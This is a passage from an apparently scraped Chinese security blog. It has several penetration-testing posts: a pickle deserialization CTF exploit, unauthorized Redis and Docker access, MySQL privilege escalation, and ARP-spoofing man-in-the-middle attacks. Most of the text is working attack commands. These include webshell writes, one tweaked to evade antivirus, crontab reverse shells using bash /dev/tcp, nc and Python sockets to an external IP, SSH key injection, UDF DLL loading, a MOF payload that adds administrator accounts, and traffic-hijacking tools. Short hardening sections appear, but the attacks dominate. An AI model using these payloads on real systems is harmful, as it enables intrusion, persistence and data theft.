b&#x27;&#x27;&#x27;cguess_gamegame&#125;S&quot;win_count&quot;I10sS&quot;round_count&quot;I10sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x03sb.&#x27;&#x27;&#x27;s.send(struct.pack(&#x27;&gt;I&#x27;, len(exp)))s.send(exp)print(s.recv(1024))print(s.recv(1024))print(s.recv(1024))print(s.recv(1024)) 分析一下构造过程 1234567cguess_gamegame # 引入guess_game.game类&#125;S&#x27;round_count&#x27; # push一个空的字典，把round_count和win_count加到里面I10sS&#x27;win_count&#x27;I10sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\xffsb. 最后一行前两个字母表示对象更新，后面一串是guess_game.Ticket对象序列化的结果，pickle 序列流执行完后会把栈顶的值返回，那结尾再留一个 Ticket 的对象就行了 12345678910111213141516171819202122232425262728293031from guess_game.Ticket import Ticketfrom guess_game.Game import Gameimport pickleexp = b&#x27;&#x27;&#x27;cguess_gamegame&#125;S&quot;win_count&quot;I10sS&quot;round_count&quot;I10sb\\x80\\x03cguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x03sb.&#x27;&#x27;&#x27;exp1 = b&#x27;&#x27;&#x27;cguess_gamegame&#125;S&quot;win_count&quot;I10sS&quot;round_count&quot;I10sb.&#x27;&#x27;&#x27;a=Ticket(3)print(pickle.dumps(a))# b&#x27;\\x80\\x03cguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x03sb.&#x27;b=pickle.loads(exp)print(b)# &lt;guess_game.Ticket.Ticket object at 0x7f9370b61a90&gt;print(b.__dict__)# &#123;&#x27;number&#x27;: 3&#125;c=pickle.loads(exp1)print(c)# &lt;guess_game.Game.Game object at 0x7f9370b50eb8&gt;print(c.__dict__)# &#123;&#x27;win_count&#x27;: 10, &#x27;curr_ticket&#x27;: &lt;guess_game.Ticket.Ticket object at 0x7f9370b50f60&gt;, &#x27;round_count&#x27;: 10&#125; 参考： https://www.xjimmy.com/python-36-serialization.html https://zhuanlan.zhihu.com/p/89132768 https://www.anquanke.com/post/id/188981 http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://www.moonback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Python","slug":"Python","permalink":"http://www.moonback.xyz/tags/Python/"}]},{"title":"未授权访问总结","slug":"未授权访问总结","date":"2020-04-05T15:33:21.000Z","updated":"2020-04-05T14:55:13.306Z","comments":true,"path":"2020/04/05/未授权访问总结/","link":"","permalink":"http://www.moonback.xyz/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/","excerpt":"本篇博客主要介绍了未授权访问的相关内容！","text":"本篇博客主要介绍了未授权访问的相关内容！ 简介未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。 Redis未授权访问简介Redis 是一个高性能的 Key – Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足在部分场合可以对关系数据库起到很好的补充作用。 Redis 默认情况下会绑定在 0.0.0.0:6379，这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。 攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法成功地在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。 Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。 复现这里直接用vulhub搭一下环境，搭建好用namp扫下,查看一下Redis的详细信息 1nmap -A -p 6379 --script redis-info 47.97.210.141 由于目标环境没有开启认证(空密码)，我们可以直接登陆进去 1redis-cli -h 47.97.210.141 -p 6379 常见的Redis命令(不区分大小写)： 123456789101112ping #查看redis启动状态，返回PONG为正常key * #查看redis中的所有键exists key #判断一个键是否存在，存在返回1，否则返回0del key [key...] #删除一个或多个键，返回删除的键的个数type key #获得键值的数据类型set key value #给键赋值mset key1 v1 key2 v2 key3 v3 #同时给多个键赋值get key #取值mget key1 key2 key3 #同时获取多个键值append key value #在字符串后面追加值，如果该键不存在即为为这个键赋值（该命令第二个参数需要加引号，因为有可能追加空格，所以要引起来）strlen key #返回键值的长度，如果不存在返回0config #获取和设置配置 网站写马如果目标服务开的有web服务,并且对应目录有写的权限，我们可以试着往网站目录写一个webshell 1234config set dir /var/www/html/config set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;save 如果网站目录没有写权限，我们可以在/tmp里写，然后找文件包含之类的漏洞 真实环境的Redis数据库会很大，我们直接save的话会保存一个很大的文件，而且里面不免有影响webshell正常执行的因素，因此一个比较好的思路就是将Redis保存的文件作为中间文件，再用这个中间文件来写shell，并且从备份的文件里找到一个靠前的键，把shell写入值里，可以构造类似： 123456&lt;?phpset_time_limit(0); //取消执行时间限制$fp=fopen(&#x27;wtf.php&#x27;,&#x27;w&#x27;);fwrite($fp,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);exit(); ?&gt; 当然没有顾虑的话也可以直接用flushall删库跑路 结合SSH免密码登录如果Redis使用root用户启动，并且开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。 在kali /root/.ssh目录下执行 1234567ssh-keygen -t rsa(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; foo.txtcat foo.txt | redis-cli -h 47.97.210.141 -p 9997 -x set crackitredis-cli -h 47.97.210.141 -p 9997 config set dir /root/.ssh/ config set dbfilename &quot;authorized_keys&quot; save 命令执行这里直接用github上大佬的exp：https://github.com/Ridter/redis-rce exp.so可以从这里获得：https://github.com/n0b0dyCN/redis-rogue-server 1python3 redis-rce.py -r 47.97.210.141 -p 9997 -L 47.97.210.141 -f exp.so 计划任务反弹shellRedis以root权限运行时可以写crontab来执行命令反弹shell 12345redis-cli -h 47.97.210.141 -p 9997set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/47.97.210.141/4444 0&gt;&amp;1\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 防护手段修改redis.conf监听本机地址127.0.0.1 修改redis.conf添加requirepass mypassword设置认证 修改 redis.conf 文件，禁用远程修改 DB 文件地址 123rename-command FLUSHALL &quot;&quot;rename-command CONFIG &quot;&quot;rename-command EVAL &quot;&quot; 以低权限运行 Redis 服务 1groupadd -r redis &amp;&amp; useradd -r -g redis redis iptables 1234567891011// accept## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT// drop## iptables -I INPUT -p tcp --dport 6379 -j DROP## iptables -I INPUT -p udp --dport 6379 -j DROP// 保存规则并重启 iptables## service iptables save## service iptables restart Docker未授权访问简介Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。 Docker Remote API 是一个取代远程命令行界面（rcli）的REST API，监听在0.0.0.0:2375。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。 复现还是用Vulhub上的 访问/version可以看到版本信息 也可以直接用docker命令 1docker -H tcp://47.97.210.141:9375 version 同样我们可以执行其它命令 计划任务反弹shell随意启动一个镜像，没有的话pull一个，这里用的是基于Alpine Linux的超小型Docker镜像,大小只有几兆 1docker -H tcp://47.97.210.141:9375 pull alpine:latest 接着 123456# 启动容器docker -H tcp://47.97.210.141:9375 run -id -v /:/tmp alpine:latest# 列一下正在运行的容器docker -H tcp://47.97.210.141:29375 ps# 进入容器并把/目录挂载到容器的/tmp目录下docker -H tcp://47.97.210.141:9375 exec -it 7c99cec3c42a sh 可以看到我们已经成功挂载并可以读取文件了，写后门，然后退出 1echo &#x27;* * * * * /usr/bin/nc 47.97.210.141 9000 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root 也可以写入其他的,视环境而定，比如python 1echo -e &quot;*/1 * * * * root /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#x27;\\n&quot; &gt;&gt; /etc/crontab 同样，可以将反弹shell的脚本写入写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统) 写ssh公钥写ssh公钥和上面方法类似，都是写文件嘛 1ssh-keygen -t rsa 把文件内容放到目标主机/root/.ssh/id_rsa.pub文件里就行了 github上有个脚本：https://github.com/Tycx2ry/docker_api_vul 可以直接执行脚本写计划任务反弹shell等操作 防护手段在不必需的情况下，不要启用 docker 的 remote api 服务，如果必须使用的话，可以采用如下的加固方式： 设置 ACL，仅允许信任的来源 IP 连接 设置 TLS 认证，官方的文档为 Protect the Docker daemon socket 修改 Docker 的启动参数：定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1，将默认端口 2375 改为自定义端口 参考： https://www.runoob.com/redis/redis-tutorial.html https://www.cnblogs.com/Qsunshine/p/redis.html https://xz.aliyun.com/t/2320 https://www.secpulse.com/archives/39440.html","categories":[],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"http://www.moonback.xyz/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"Redis","slug":"Redis","permalink":"http://www.moonback.xyz/tags/Redis/"},{"name":"Docker","slug":"Docker","permalink":"http://www.moonback.xyz/tags/Docker/"}]},{"title":"Mysql提权总结","slug":"mysql提权总结","date":"2020-03-30T09:40:47.000Z","updated":"2020-04-28T07:29:27.863Z","comments":true,"path":"2020/03/30/mysql提权总结/","link":"","permalink":"http://www.moonback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","excerpt":"本篇博客主要介绍了mysql提权的相关内容！","text":"本篇博客主要介绍了mysql提权的相关内容！ mysql提权简介我个人理解的mysql提权就是通过sql注入，爆破mysql用户密码等方式从而让我们可以执行sql语句，在此基础上达到执行命令，获取用户权限等等！ CVE-2012-2122漏洞简介该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。 影响版本受影响版本： MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not. MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not. 漏洞复现msf里面已经集成了利用模块 1234use auxiliary/scanner/mysql/mysql_authbypass_hashdumpset rhosts 127.0.0.1set rport 3306run 然后解hash就行，解出来登陆 1mysql -u root -P 9906 -h 127.0.0.1 -p 当然爆破登陆的方式不止这一种 shell脚本： 1for i in `seq 1 1000`; do mysql -u root -h 127.0.0.1 -P 9906 --password=bad 2&gt;/dev/null; done python脚本： 1234#!/usr/bin/pythonimport subprocesswhile 1: subprocess.Popen(&quot;mysql -u root -h 47.97.210.171 -P 9906 --password=aaa&quot;, shell=True).wait() 利用写shelloutfile写文件该操作需要写文件的目录要有写权限，并且mysql也要有写文件权限，需要进行以下更改参数 secure_file_priv 参数是只读参数，不能使用 SET GLOBAL 语句修改，只有修改 MySQL 的配置文件并重启 MySQL 才能对此进行修改。 12mysql&gt; SET GLOBAL secure_file_priv=&#x27;&#x27;;ERROR 1238 (HY000): Variable &#x27;secure_file_priv&#x27; is a read only variable 修改mysql.ini 文件，在[mysqld] 下添加条目: secure_file_priv = 保存，重启mysql。 123值为null ，也就是注释掉这个参数或者secure_file_priv&#x3D;null。表示限制mysqld 不允许导入|导出值为&#x2F;tmp&#x2F; ，即secure_file_priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; 表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下没有具体值时，即secure_file_priv&#x3D; 表示不对mysqld 的导入|导出做限制 以sqli-labs第一关为例 1?id=-1&#x27; union select 1,@@basedir,@@datadir%23 @@basedir是指Mysql的安装目录，@@datadir是指数据库文件的路径，我们需要用web目录，可以根据以上的信息猜一下 然后就可以写马了 1?id=1&#x27; union select 1,2,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23 这种Windows Defender直接杀了，下面这个可以过Windows Defender 1?id=1&#x27; union select 1,2,&#x27;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23 可以直接用sqlmap写webshell文件 利用日志写shell前提是知道mysql root用户密，这里以phpmyadmin为例 开启日志记录 1set global general_log=&#x27;on&#x27;; 日志文件导出指定目录 1set global general_log_file=&#x27;C:/phpstudy/PHPTutorial/WWW/1.php&#x27;; 记录sql语句写马 1select &#x27;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&#x27;; 关闭记录 1set global general_log=off; udf提权udf提权简介UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。 动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用 udf提权的前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。 复现当然udf提权的前提是开启secure_file_priv参数 首先我们要判断mysql版本，根据不同的版本： mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/ mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL/lib/plugin/，默认是没plugin路径的 查询插件安装目录： 1SHOW VARIABLES LIKE &#x27;%plugin%&#x27; 大马提权这里用的是：https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php 上传udf.php,登录进去，它会自动判断mysql版本决定出导出dll文件位置 先点Create PluginDir创建plugin目录，然后Dump UDF –&gt; Create Function –&gt; Mysql_query依次导出dll到指定目录，将udf的自定义函数引入，执行命令 可以看到我们已经拿到这台靶机的管理员权限 想要删除函数可以用 12drop function shell; 删除函数delete from mysql.func where name=&#x27;shell&#x27; 删除函数 手工提权先查看一下系统架构 1select @@version_compile_os, @@version_compile_machine; 然后把对应系统udf.dll或者udf.so上传上去 网址：https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql 上传的时候我们可以使用网络路径 1select load_file(&#x27;\\\\\\\\192.168.0.19\\\\network\\\\lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; 另一种方法是将整个DLL文件以十六进制编码后写入磁盘。 123select hex(load_file(&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;/tmp/udf.hex&#x27;;select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dump file &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; 还有一种方法是创建一个表并将二进制数据插入到十六进制编码流中。你可以通过insert语句或将其分解为多个部分，然后通过update语句拼接二进制数据。 1234567create table temp(data longblob);insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);select data from temp into dump file &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; 或者你也可以直接从磁盘将文件从网络共享加载到上面创建的表中，或使用“快速导入数据（load data infile）”语句在本地加载。将文件像上面显示的那样转换为十六进制，并在写入磁盘时解码。 12345load data infile &#x27;\\\\\\\\192.168.0.19\\\\network\\\\udf.hex&#x27; into table temp fields terminated by &#x27;@OsandaMalith&#x27; lines terminated by &#x27;@OsandaMalith&#x27; (data);select unhex(data) from temp into dumpfile &#x27;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&#x27;; 这里有个好消息，就是从MySQL 5.6.1和MariaDB 10.0.5开始，新增了to_base64和from_base64函数。如果你是一个善于绕过SQL注入WAF的人，相信你已经在使用这些函数了（提示：路由查询注入）。 12select to_base64(load_file(&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;/tmp/udf.b64&#x27;; 你可以编辑base64文件并通过以下方式将其dump到插件目录。 1234567891011select from_base64(&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIAAABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAREAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;) into dumpfile &quot;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&quot;; 之后，你可以像这样将整个文件传递给mysql。 1mysql -h192.168.0.30 -uosanda -pabc123 &lt; /tmp/udf.b64 你也可以从网络共享写入base64编码文件或使用“快速导入数据（load data infile）”语句在本地加载并通过以下语句dump。 12select from_base64(data) from temp into dumpfile &#x27;D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll&#x27;; 接着将udf的自定义函数引入 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27; 执行命令 1select sys_eval(&#x27;whoami&#x27;) 反弹端口提权原理就是基于udf提权 exp：https://github.com/BeyondOneself/mysql-reverse-shell-priviledge 声明一个backdoor函数，第二条定义的@a是udf.dll内容的16进制 执行即可成功反弹shell 1select backshell(&quot;192.168.0.12&quot;,4444); mof提权mof提权简介MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。 MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 利用条件 Windows&lt;=2003 mysql在c:windows/system32/mof目录有写权限 已知数据库账号密码 exp: 12345678910111213141516171819202122#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user test 123456 /add\\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer = $Consumer;Filter = $EventFilter;&#125;; 确保了前面的条件之后，我们可以先上传我们的mof文件到服务器任意目录，一般是网站允许上传的目录。 然后通过mysql语句将这个文件导入到nullevt.mof 1select load_file(&quot;F:/wamp/www/upload/test.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot; 这里用到了dumpfile而不是outfile是因为： dumpfile只能导出一行数据 outfile可以完整的导出每行记录，并且会在行末端写入新行，并且会转义换行符。 如果用outfile这个二进制可执行文件就会被破坏，所以这里我们使用了dumpfile。 然后我们分别两次将创建用户和提权命令替换poc中的命令做上述操作即可。两次使用的命令如下: 12net.exe user test 123456 /addnet.exe user localgroup administrators test /add 删除账号需要重启服务： 123net stop winmgmtdel c:/windows/system32/wbem/repositorynet start winmgmt 按照这种思路我们也可以写vbs到开机启动项 12345create table a (cmd text); insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); select * from a into outfile &quot;C:\\\\Documents and Settings\\\\All Users\\\\「开始」菜单\\\\程序\\\\启动\\\\a.vbs&quot;; 参考： https://xz.aliyun.com/t/7392 https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83 https://xz.aliyun.com/t/2719 https://www.freebuf.com/articles/system/163144.html https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.moonback.xyz/tags/mysql/"},{"name":"提权","slug":"提权","permalink":"http://www.moonback.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"中间人攻击学习","slug":"中间人攻击学习","date":"2020-03-25T10:16:03.000Z","updated":"2020-03-26T04:31:06.328Z","comments":true,"path":"2020/03/25/中间人攻击学习/","link":"","permalink":"http://www.moonback.xyz/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/","excerpt":"本篇博客主要介绍中间人攻击的相关内容！","text":"本篇博客主要介绍中间人攻击的相关内容！ 本文仅作技术交流，请勿做违法乱纪的事！ 中间人攻击中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。这样的话，两台通信计算机之间的流量都会经过被控计算机，通过信息篡改，信息窃取等方式对正常的通信造成威胁。 随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。 arp地址欺骗在同一局域网内的主机通信依靠arp地址而不是ip地址，当两台主机通信时(A 和 B)，主机A 向主机B发送一个arp广播（内有主机B的IP地址），局域网内的所有主机都会收到这个arp包，然后与在自己的ip地址进行比较，如果符合就回复给主机 A 一个带有自己的arp地址的arp包，同时将主机 A 的arp地址记录下来。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的，主机的每次通信都需要从新发送arp广播包得到主机 B 的arp地址（动态性）。 如果这时有一台主机C想要获取两台主机的通信过程时，主机C 可以主动向主机A 发送 arp应答包 主机A接收到这个应答包后更新自己的arp缓存表 当然还是B的ip但mac地址已经改变 ，这时主机C再正常连接主机B，这样就可以监听双方的通信过程并且不被发现 ，这是一种最典型的arp欺骗。 常用工具arp-scanarp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR、地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬件厂商，帮助用户确认目标。 查看同一局域网存活的主机： 1arp-scan --interface=wlan0 --localnet arpspoofarpspoof是一个好用的ARP欺骗工具。 1arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host -i 指定网卡 -c 指定还原arp配置时使用的硬件地址 -t 指定arp欺骗的目标 host一般为网关 -r 欺骗两个主机（网关和目标）以捕获双向通信 欺骗网关和目标： 1arpspoof -i wlan0 -t 192.168.1.105 -r 192.168.1.1 driftnetdriftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。该工具可以实时和离线捕获指定数据包中是图片，kali里默认有。 主要参数： -b 捕获到新的图片时发出嘟嘟声 -i interface 选择监听接口 -f file 读取一个指定pcap数据包中的图片 -p 不让所监听的接口使用混杂模式 -a 后台模式：将捕获的图片保存到目录中（不会显示在屏幕上） -m number 指定保存图片数的数目 -d directory 指定保存图片的路径 -x prefix 指定保存图片的前缀名 后台监听网卡保存图片并提示： 1driftnet -i wlan0 -b -a -d /root/Desktop/pic xerosploitgithub地址：https://github.com/LionSec/xerosploit Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。由bettercap和nmap强力驱动。 可惜的是，这款工具已经很长时间不维护了，但功能依旧很强大 工具安装： 123git clone https://github.com/LionSec/xerosploitcd xerosploit &amp;&amp; sudo python install.pysudo xerosploit 安装中可能会会缺少依赖包，直接pip安装就行 有这么多模块，直接使用就行，非常方便： 12345678910111213pscan：端口扫描dos：对目标进行dos攻击ping：对目标进行ping是否存活injecthtml：将html注入到目标访问的网站中injectjs：将javascript注入到目标访问的网站中rdownload：替换目标下载的文件sniff：嗅探目标的流量信息dspoof：将所有http流量重定向到特定ipyplay：在目标的浏览器中后台播放youtube视频（还得fq）replace：替换目标访问网站的所有图片driftnet：查看目标访问网站的所有图片move：让目标访问网站变得抖动deface：将目标访问网站的所有页面替换成自己定义的html代码 抓取局域网里的图片kali：192.168.0.112 靶机：192.168.0.103 没进行arp欺骗之前，我们看下arp表 让后设置ip转发,默认为0 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 如果不设置为1，进行下面的操作相当于断网攻击 然后我们进行欺骗 1arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1 此时我们再看下arp表，发现mac地址已经发生改变成kali的mac地址 可以看到这里已经抓到图片，感谢大佬的博客做实验，逃…… 发现并不是很全，https的都没抓到 我们用wireshark查看一下流量，设置一下源地址，就能看到截获的流量 1ip.src==192.168.0.103 xerosploit一些操作安装结束后直接运行xerosploit 输入help获取帮助，直接scan命令扫描，有时候侯可能扫描不到，直接输ip就行 进入modules之后，help查看所有模块，先试试注入html 1&lt;h1 style=&quot;font-size:80px;&quot; &gt;hacked by MoonBack!&lt;/h1&gt; 